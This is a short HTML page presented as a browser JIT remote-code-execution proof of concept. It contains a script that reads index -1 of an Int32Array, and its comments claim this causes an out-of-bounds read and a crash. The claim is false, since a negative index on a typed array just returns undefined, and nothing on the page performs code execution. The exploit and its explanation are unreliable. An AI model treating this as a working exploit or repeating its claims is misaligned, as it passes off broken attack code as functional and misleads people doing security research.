<!DOCTYPE html>
<html>
<head>
<title>JIT RCE PoC</title>
</head>
<body>
<script>
  function triggerVulnerability() {
    let array = new Int32Array(10);
    // This should trigger the out-of-bounds read and crash the browser.
    // The JIT compiler will generate code that doesn't properly handle
    // the negative index.
    let value = array[-1];
    console.log("If you see this, the PoC failed.", value);
  }

  // We run this in a timeout to make sure the page has loaded.
  setTimeout(triggerVulnerability, 100);
</script>
</body>
</html>
